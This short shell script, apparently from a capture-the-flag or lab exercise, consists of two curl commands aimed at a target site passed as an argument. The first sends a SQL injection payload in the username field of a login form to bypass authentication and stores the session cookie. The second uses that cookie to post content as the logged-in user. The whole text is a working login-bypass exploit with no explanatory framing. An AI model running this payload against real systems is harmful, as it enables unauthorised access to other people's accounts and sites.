curl --cookie-jar cookie.txt --output response.txt --data "username=' OR '1' = '1' order by length(username)--&password=&form=login&submit=Login" "${1}/post.php"
curl --cookie cookie.txt --data "title=haha&content=12345&type=1&form=content&submit=Post" "${1}/post.php"
